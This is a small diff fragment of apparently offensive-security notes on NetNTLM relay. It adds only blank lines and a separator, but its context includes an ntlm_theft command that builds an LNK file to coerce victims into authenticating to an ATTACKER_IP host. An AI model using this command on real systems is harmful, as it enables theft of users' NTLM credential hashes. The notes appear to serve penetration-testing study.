@@ -8,3 +8,8 @@ during NetNTLM authentication, tricking the client into talking to you instead o
 ntlm_theft : Create documents that require authentification to coerce authentification.
       python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f stealthy  (creates lnk file) 
 
+
+
+
+
+---------------------------------------------------------------------------------------
